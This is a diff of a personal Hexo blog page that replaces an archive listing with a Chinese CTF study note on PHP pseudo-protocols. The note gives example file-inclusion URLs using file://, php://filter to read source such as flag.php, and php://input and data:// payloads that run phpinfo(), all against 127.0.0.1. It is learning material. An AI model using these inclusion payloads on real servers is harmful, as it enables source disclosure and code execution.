@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>Archives - Hexo</title>
+<title>php伪协议笔记 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,8 +114,18 @@
 
             <div class="page-title">
     <ul>
-        <li><a href="/" data-name="Home" title="Back Home">Home</a></li>
-        <li><a href="/tags" data-name="Tag Cloud" title="Tag Cloud">Tags</a></li>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
         <li class="page-search">
     <form id="search" class="search-form">
         <input type="text"
@@ -131,87 +141,88 @@
 <div class="main-inner">
     <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
         <div class="post-header">
-            <h3 class="post-title">Nice 🥳 6 posts in total. Keep on posting.</h3>
-        </div>
-        
-
-        <div class="post-content markdown-body" itemprop="articleBody">
-            <div class="archives">
-                
-                
-                
-                
-                
-                <div class="archives-item">
-                    <h2>2020年12月</h2>
-                    <ul class="archives_list">
-                        
-                        <li>02日23:12:18
-                            <a href="/test1/undefined-undefined.html">攻防世界练习---伪协议</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>02日21:52:25
-                            <a href="/note2/undefined-undefined.html">PHP伪协议笔记</a>
-                            
-                        </li>
-                        
-                    </ul>
-                </div>
-                
-                
-                
-                
-                
-                <div class="archives-item">
-                    <h2>2020年11月</h2>
-                    <ul class="archives_list">
-                        
-                        <li>29日15:49:38
-                            <a href="/note1/undefined-undefined.html">PHP中foreach函数笔记</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>28日22:41:48
-                            <a href="/note/undefined-undefined.html">第一周学习报告</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>28日16:42:13
-                            <a href="/test/undefined-undefined.html">web第一周练习</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>22日20:45:37
-                            <a href="/%E7%BB%83%E4%B9%A0/undefined-undefined.html">web习题练习1</a>
-                            
-                        </li>
-                        
-                    </ul>
-                </div>
-                
-                
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2020-12-02">2020-12-02</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">PHP伪协议笔记</h2>
+            <div class="post-meta">
+                emm... 1502 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
+        <div class="post-content markdown-body">
+            <p>本周学习了关于PHP的伪协议相关知识，现在做一下总结<br>先给出我学习的网址<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a><br>PHP伪协议包括file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://。下面介绍常用的几个  </p>
+<h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h1><p>file://协议在双off的情况下也可以正常使用<br>allow_url_fopen ：off/on<br>allow_url_include：off/on<br>file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow _url _fopen与allow _url _include的影响。<br>使用方法<br>file:// [文件的绝对路径和文件名]  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a>  </p>
+</blockquote>
+<p>file:// [文件的相对路径和文件名]  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a>  </p>
+</blockquote>
+<p>http://网络路径和文件名  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a>  </p>
+</blockquote>
+<h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p>这个是我目前用到最多的，它包括php://filter、php://input、 php://stdin、 php://memory 和 php://temp,不需要开启allow _url _fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow _url _include。<br>其中php://filter和php://input使用较多<br><img src="https://s3.ax1x.com/2020/12/02/Do1AuF.md.png" alt="Do1AuF.md.png">  </p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>该协议用于读取源码<br><img src="https://s3.ax1x.com/2020/12/02/Do1GHH.md.png" alt="Do1GHH.md.png"><br><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=%5B%E6%96%87%E4%BB%B6%E5%90%8D%5D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%EF%BC%88%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E7%BC%96%E7%A0%81%EF%BC%89">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</a>  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p>
+</blockquote>
+<h2 id="php-input-POST-DATA-执行php代码"><a href="#php-input-POST-DATA-执行php代码" class="headerlink" title="php://input+[POST DATA]执行php代码"></a>php://input+[POST DATA]执行php代码</h2><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a><br>[POST DATA] <?php phpinfo()?></p>
+</blockquote>
+<h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
+</blockquote>
+<p>关于zip://、compress.bzip2://、compress.zlib://这三个协议目前还没有遇到相关题目，以后遇到再总结更新</p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
+            
+        </div>
+        
     </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
 </div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
